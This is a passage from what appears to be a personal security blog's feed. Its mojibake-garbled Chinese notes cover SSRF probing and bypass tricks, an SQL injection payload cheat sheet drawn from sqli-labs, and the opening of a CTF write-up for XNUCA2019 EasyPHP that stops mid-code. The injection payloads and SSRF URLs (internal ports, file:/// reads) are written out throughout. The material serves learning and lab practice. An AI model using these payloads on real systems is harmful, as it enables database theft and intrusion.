    <content><![CDATA[<h4 id="SSRFæ¼æ´ä»‹ç»ï¼š"><a href="#SSRFæ¼æ´ä»‹ç»ï¼š" class="headerlink" title="SSRFæ¼æ´ä»‹ç»ï¼š"></a>SSRFæ¼æ´ä»‹ç»ï¼š<a id="more"></a></h4><p>ã€€ã€€SSRFæ¼æ´ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ï¼šæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p>
<h4 id="SSRFæ¼æ´åŸç†ï¼š"><a href="#SSRFæ¼æ´åŸç†ï¼š" class="headerlink" title="SSRFæ¼æ´åŸç†ï¼š"></a>SSRFæ¼æ´åŸç†ï¼š</h4><p>ã€€ã€€SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚SSRFæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p>
<h4 id="SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š"><a href="#SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š" class="headerlink" title="SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š"></a>SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š</h4><p>ã€€ã€€1.å¯ä»¥å¯¹å¤–ç½‘ã€å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼ŒæŸäº›æƒ…å†µä¸‹ç«¯å£çš„Bannerä¼šå›æ˜¾å‡ºæ¥ï¼ˆæ¯”å¦‚3306çš„ï¼‰ï¼›</p>
<p>ã€€ã€€2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„æœ‰æ¼æ´ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰ï¼›</p>
<p>ã€€ã€€3.å¯ä»¥å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼ŒåŸç†æ˜¯é€šè¿‡è¯·æ±‚é»˜è®¤çš„æ–‡ä»¶å¾—åˆ°ç‰¹å®šçš„æŒ‡çº¹ï¼›</p>
<p>ã€€ã€€4.æ”»å‡»å†…ç½‘æˆ–å¤–ç½‘æœ‰æ¼æ´çš„Webåº”ç”¨ï¼›</p>
<p>ã€€ã€€5.ä½¿ç”¨fileï¼š///åè®®è¯»å–æœ¬åœ°æ–‡ä»¶(æˆ–å…¶ä»–åè®®ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ã€€ã€€http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;192.168.1.10:3306</span><br><span class="line"></span><br><span class="line">ã€€ã€€http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure>

<h4 id="SSRFæ¼æ´å‡ºç°ç‚¹ï¼š"><a href="#SSRFæ¼æ´å‡ºç°ç‚¹ï¼š" class="headerlink" title="***SSRFæ¼æ´å‡ºç°ç‚¹ï¼š"></a>***SSRFæ¼æ´å‡ºç°ç‚¹ï¼š</h4><p>ã€€ã€€1.åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</p>
<p>ã€€ã€€2.è½¬ç æœåŠ¡ï¼ˆé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ï¼Œä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•çš„æµè§ˆï¼‰</p>
<p>ã€€ã€€3.åœ¨çº¿ç¿»è¯‘</p>
<p>ã€€ã€€4.å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p>
<p>ã€€ã€€5.å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</p>
<p>ã€€ã€€6.æœªå…¬å¼€çš„apiå®ç°åŠè°ƒç”¨URLçš„åŠŸèƒ½</p>
<p>ã€€ã€€7.ä»URLå…³é”®å­—ä¸­å¯»æ‰¾</p>
<h4 id="SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š"><a href="#SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š" class="headerlink" title="***SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š"></a>***SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š</h4><p>ã€€ã€€1.@ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<a href="http://abc.com@127.0.0.1" target="_blank" rel="noopener">http://abc.com@127.0.0.1</a></p>
<p>ã€€ã€€2.æ·»åŠ ç«¯å£å·ã€€ã€€ã€€ã€€ã€€ã€€<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p>
<p>ã€€ã€€3.çŸ­åœ°å€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<a href="https://0x9.me/cuGfD" target="_blank" rel="noopener">https://0x9.me/cuGfD</a></p>
<p>ã€€ã€€4.å¯ä»¥æŒ‡å‘ä»»æ„ipçš„åŸŸåã€€ xip.io</p>
<p>ã€€ã€€5.ipåœ°å€è½¬æ¢æˆè¿›åˆ¶æ¥è®¿é—® 192.168.0.1=3232235521ï¼ˆåè¿›åˆ¶ï¼‰</p>
<p>ã€€ã€€6.éHTTPåè®®</p>
<p>ã€€ã€€7.DNS Rebinding</p>
<h3 id="SSRFæ¼æ´çš„éªŒè¯"><a href="#SSRFæ¼æ´çš„éªŒè¯" class="headerlink" title="***SSRFæ¼æ´çš„éªŒè¯"></a>***SSRFæ¼æ´çš„éªŒè¯</h3><p>æˆ‘ä»¬å…ˆéªŒè¯ï¼Œè¯·æ±‚æ˜¯å¦æ˜¯æœåŠ¡å™¨ç«¯å‘å‡ºçš„ï¼Œå¯ä»¥å³é”®å›¾ç‰‡ï¼Œä½¿ç”¨æ–°çª—å£æ‰“å¼€å›¾ç‰‡ï¼Œå¦‚æœæµè§ˆå™¨ä¸Šåœ°å€æ æ˜¯<a href="http://www.baidu.com/img/bd_logo1.pngï¼Œè¯´æ˜ä¸å­˜åœ¨SSRFæ¼æ´ã€‚" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.pngï¼Œè¯´æ˜ä¸å­˜åœ¨SSRFæ¼æ´ã€‚</a></p>
<p>å¯ä»¥ç”¨Firebug æˆ–è€…burpsuiteæŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­æ˜¯å¦åŒ…å«<a href="http://www.baidu.com/img/bd_logo1.pngè¿™ä¸ªè¯·æ±‚ã€‚ç”±äºSSRFæ˜¯æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½è¿™å¼ å›¾ç‰‡çš„æ—¶å€™æœ¬åœ°æµè§ˆå™¨ä¸­ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ã€‚" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.pngè¿™ä¸ªè¯·æ±‚ã€‚ç”±äºSSRFæ˜¯æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½è¿™å¼ å›¾ç‰‡çš„æ—¶å€™æœ¬åœ°æµè§ˆå™¨ä¸­ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ã€‚</a></p>
<p>åœ¨éªŒè¯å®Œæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ä¹‹åï¼Œæ­¤å¤„å°±æœ‰å¯èƒ½å­˜åœ¨SSRFï¼Œæ¥ä¸‹æ¥éœ€è¦éªŒè¯æ­¤URLæ˜¯å¦å¯ä»¥æ¥è¯·æ±‚å¯¹åº”çš„å†…ç½‘åœ°å€ã€‚é¦–å…ˆæˆ‘ä»¬è¦è·å–å†…ç½‘å­˜åœ¨HTTPæœåŠ¡ä¸”å­˜åœ¨favicon.icoæ–‡ä»¶åœ°å€ï¼Œæ‰èƒ½éªŒè¯æ˜¯å¦æ˜¯SSRFã€‚</p>
<p>æ­¤å¤„æ‰¾å†…ç½‘åœ°å€å¯ä»¥é€šè¿‡ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„éœ²çš„å†…ç½‘åœ°å€è¿‡æ»¤ç»•è¿‡</p>
<p>@ï¼š<br><a href="http://www.baidu.com@10.10.10.10ä¸http?/10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10ä¸http?/10.10.10.10</a> è¯·æ±‚æ˜¯ç›¸åŒçš„</p>
<p>è¿‡æ»¤ç»•è¿‡<br>IPåœ°å€è½¬æ¢æˆåè¿›åˆ¶ï¼š<br>127.0.0.1=2130706433</p>
<h4 id="SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š-1"><a href="#SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š-1" class="headerlink" title="SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š"></a>SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š</h4><p>ã€€ã€€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.åŸºæœ¬åˆ¤æ–­ï¼ˆæ’é™¤æ³•ï¼‰</span><br><span class="line"></span><br><span class="line">ã€€ã€€å¦‚ï¼šhttp:&#x2F;&#x2F;www.douban.com&#x2F;***&#x2F;service?image&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png</span><br><span class="line"></span><br><span class="line">ã€€ã€€æ’é™¤æ³•ä¸€ï¼šç›´æ¥å³é”®å›¾ç‰‡ï¼Œåœ¨æ–°çª—å£æ‰“å¼€å›¾ç‰‡ï¼Œå¦‚æœæ˜¯æµè§ˆå™¨ä¸ŠURLåœ°å€æ æ˜¯http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.pngï¼Œè¯´æ˜ä¸å­˜åœ¨SSRFæ¼æ´ã€‚</span><br><span class="line"></span><br><span class="line">ã€€ã€€æ’é™¤æ³•äºŒï¼šä½¿ç”¨burpsuiteç­‰æŠ“åŒ…å·¥å…·æ¥åˆ¤æ–­æ˜¯å¦ä¸æ˜¯SSRFï¼Œé¦–å…ˆSSRFæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½å›¾ç‰‡çš„æ—¶å€™ï¼Œæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬æœ¬åœ°æµè§ˆå™¨çš„è¯·æ±‚ä¸­å°±ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ï¼Œå¦‚æœåˆ·æ–°å½“å‰é¡µé¢ï¼Œæœ‰å¦‚ä¸‹è¯·æ±‚ï¼Œåˆ™å¯åˆ¤æ–­ä¸æ˜¯SSRFã€‚ï¼ˆå‰æè®¾ç½®burpsuiteæˆªæ–­å›¾ç‰‡çš„è¯·æ±‚ï¼Œé»˜è®¤æ˜¯æ”¾è¡Œçš„ï¼‰</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli</title>
    <url>/2020/01/13/sqli/</url>
    <content><![CDATA[<p>æ ¹æ®sqli-labsä¸Šçš„æ•™å­¦åšäº†ä¸€ä¸ªsqlç”¨æ³•çš„æ€»ç»“</p>
<a id="more"></a>

<h4 id="1-unionè”åˆæŸ¥è¯¢"><a href="#1-unionè”åˆæŸ¥è¯¢" class="headerlink" title="1.unionè”åˆæŸ¥è¯¢"></a>1.unionè”åˆæŸ¥è¯¢</h4><p>unionçš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ªsqlè¯­å¥è¿›è¡Œè”åˆ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br><span class="line">æ­¤æ—¶çš„<span class="keyword">sql</span>è¯­å¥ä¸º<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">--+ LIMIT 0,1 </span></span><br><span class="line">æ¥ç€ä¸‹ä¸€æ­¥å°±æ˜¯çˆ†æ•°æ®è¡¨</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = '</span><span class="keyword">security</span><span class="string">'#</span></span><br><span class="line"><span class="string">é€šè¿‡è¿™ä¸€æ­¥å¯ä»¥å¾—åˆ°è¡¨åï¼Œæ¥ç€æ¥çˆ†å‡ºè¡¨çš„åˆ—</span></span><br><span class="line"><span class="string">?id=-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'users'</span><span class="comment">#</span></span><br><span class="line">æœ€åå°±æ˜¯çˆ†æ•°æ®äº†ï¼Œæ ¹æ®ä¸Šä¸€æ­¥å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¡¨ä¸­æœ‰ä»€ä¹ˆåˆ—å€¼ï¼Œæ ¹æ®éœ€è¦æ¥çˆ†</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'union select 1,username,password from users where id = 2#</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æ³¨å…¥æ—¶çš„æç¤ºï¼Œå¯ä»¥åˆ¤æ–­æ³¨å…¥çš„å½¢å¼ï¼Œå¯èƒ½æ˜¯?id=1â€™),?id=1â€)ã€‚</p>
<h3 id="2-ç›²æ³¨-ä¸‹é¢çš„éƒ½æ˜¯èƒ½ä½¿ç”¨çš„payloadå±•ç¤º"><a href="#2-ç›²æ³¨-ä¸‹é¢çš„éƒ½æ˜¯èƒ½ä½¿ç”¨çš„payloadå±•ç¤º" class="headerlink" title="2.ç›²æ³¨:(ä¸‹é¢çš„éƒ½æ˜¯èƒ½ä½¿ç”¨çš„payloadå±•ç¤º)"></a>2.ç›²æ³¨:(ä¸‹é¢çš„éƒ½æ˜¯èƒ½ä½¿ç”¨çš„payloadå±•ç¤º)</h3><p>1â€™:åŸºäºå¸ƒå°”SQLç›²æ³¨</p>
<p>2â€™:åŸºäºæ—¶é—´çš„SQLç›²æ³¨</p>
<p>3â€™:åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å¸ƒå°”æ³¨å…¥</span><br><span class="line">åˆ©ç”¨left(database(),1)</span><br><span class="line">?id=1'and <span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">version</span>(),<span class="number">1</span>)=<span class="number">5</span><span class="comment">#å¯ä»¥æŸ¥çœ‹ç‰ˆæœ¬å·çš„é¦–ä½å­—</span></span><br><span class="line">åˆ©ç”¨<span class="keyword">substr</span>(a,b,c),ä»ç¬¬bä½å¼€å§‹å–å‡ºaä¸­é•¿åº¦ä¸ºcçš„å­ä¸²</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and ascii(substr(select table_name from information_schema.tables where table_schema=database()limit0,1),1,1)=113#</span></span><br><span class="line"><span class="string">åˆ©ç”¨regexpæ­£åˆ™åŒ¹é…</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> column_name regexp <span class="string">'^userame'</span><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">åˆ©ç”¨<span class="keyword">ord</span>()å’Œ<span class="keyword">mid</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and ord(mid(select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1)=68#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æŠ¥é”™æ³¨å…¥</span><br><span class="line">?id=1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br><span class="line">åˆ©ç”¨<span class="built_in">bigint</span>æº¢å‡º</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'union select(!(select * from (select user())x)-~0),2,3#</span></span><br><span class="line"><span class="string">xpathå‡½æ•°æŠ¥é”™æ³¨å…¥</span></span><br><span class="line"><span class="string">?id=1;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span></span><br><span class="line"><span class="string">updatexml</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">åˆ©ç”¨æ•°æ®é‡å¤æ€§</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å»¶æ—¶æ³¨å…¥</span><br><span class="line">åˆ©ç”¨sleep()å‡½æ•°è¿›è¡Œæ³¨å…¥</span><br><span class="line">?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">#(è‹¥æœ‰é”™è¯¯æ—¶æœ‰5ç§’æ—¶é—´å»¶æ—¶)</span></span><br><span class="line">åˆ©ç”¨benchmark()è¿›è¡Œå»¶æ—¶æ³¨å…¥</span><br><span class="line">?id=1' union <span class="keyword">select</span>(<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="keyword">by</span> <span class="number">5</span> <span class="keyword">seconds</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>)<span class="keyword">as</span> tb1<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h4 id="3-å¯¼å…¥å¯¼å‡º"><a href="#3-å¯¼å…¥å¯¼å‡º" class="headerlink" title="3.å¯¼å…¥å¯¼å‡º"></a>3.å¯¼å…¥å¯¼å‡º</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\wamp\\www\\sqllib\\Less-7\\uuu.txt"</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>



<p>addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²</p>
<p><strong>stripslashes()</strong> å‡½æ•°åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ </p>
<p><strong>mysql_real_escape_string()</strong> å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦</p>
<p>å¦‚ä½•ç»•è¿‡orå’Œandè¿‡æ»¤ï¼š</p>
<p>1.å¤§å°å†™å˜å½¢ Or,OR,oR</p>
<p>2.ç¼–ç ï¼Œhexï¼Œurlencode</p>
<p>3.æ·»åŠ æ³¨é‡Š/<em>or</em>/</p>
<p>4.åˆ©ç”¨ç¬¦å· and=&amp;&amp; or=||</p>
<p>%09 TABé”®ï¼ˆæ°´å¹³ï¼‰ </p>
<p>%0a æ–°å»ºä¸€è¡Œ </p>
<p>%0c æ–°çš„ä¸€é¡µ </p>
<p>%0d returnåŠŸèƒ½ </p>
<p>%0b TABé”®ï¼ˆå‚ç›´ï¼‰ </p>
<p>%a0 ç©ºæ ¼ </p>
<h4 id="4-å®½å­—èŠ‚æ³¨å…¥"><a href="#4-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="4.å®½å­—èŠ‚æ³¨å…¥"></a>4.å®½å­—èŠ‚æ³¨å…¥</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">åŸç†ï¼šmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç å¤§äº128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚æˆ‘ä»¬åœ¨è¿‡æ»¤ ' çš„æ—¶å€™ï¼Œå¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°† ' è½¬æ¢ä¸º \' </span><br><span class="line"></span><br><span class="line"> 1.%dfåƒæ‰ \ å…·ä½“çš„åŸå› æ˜¯urlencode('\) = %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27å‰é¢æ·»åŠ %dfï¼Œå½¢æˆ%df%5c%27ï¼Œè€Œä¸Šé¢æåˆ°çš„mysqlåœ¨GBKç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤äº‹%df%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</span><br><span class="line"> 2.å°† \' ä¸­çš„ \ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27çš„æƒ…å†µï¼Œåé¢çš„%5cä¼šè¢«å‰é¢çš„%5cç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯bypassçš„ä¸€ç§æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="5-å †å æ³¨å…¥"><a href="#5-å †å æ³¨å…¥" class="headerlink" title="5.å †å æ³¨å…¥"></a>5.å †å æ³¨å…¥</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);è¿‡æ»¤äº†æ‹¬å·å†…çš„ä¸œè¥¿</span></span><br><span class="line"><span class="string">?a=1#è¿”å›æ­£å¸¸</span></span><br><span class="line"><span class="string">å †å æŸ¥è¯¢ id=1';show databases;'çˆ†å‡ºæ•°æ®åº“å†…å®¹</span></span><br><span class="line"><span class="string">id=1';show tables;'çˆ†å‡ºæ‰€æœ‰è¡¨å</span></span><br><span class="line"><span class="string">/?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set sql_mode=pipes_as_concat;çš„ä½œç”¨ä¸ºå°†||çš„ä½œç”¨ç”±orå˜ä¸ºæ‹¼æ¥å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure>

<h4 id="6-äºŒæ¬¡æ³¨å…¥"><a href="#6-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="6.äºŒæ¬¡æ³¨å…¥"></a>6.äºŒæ¬¡æ³¨å…¥</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">/1.php?id=%2527,ç¬¬ä¸€æ¬¡è§£ç çš„ç»“æœä¸ºid=1%27,%25è§£ç ä¸º%,å¦‚æœä½¿ç”¨äº†urldecodeæˆ–è€…rawurldecodeæ¥è§£ç idå‚æ•°ï¼Œç»“æœä¸ºid=1'å•å¼•å·æˆåŠŸå‡ºç°å¼•å‘æ³¨å…¥.</span><br></pre></td></tr></table></figure>

<p>ç”¨hexå…ˆå°†å­—ç¬¦è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åç”¨CONVå‡½æ•°å°†16è¿›åˆ¶è½¬åŒ–ä¸º10è¿›åˆ¶</p>
]]></content>
      <tags>
        <tag>sqlæ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>taoismf</title>
    <url>/2020/06/26/taoismf/</url>
    <content><![CDATA[<h3 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP<a id="more"></a></h3><p>å®¡è®¡é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span 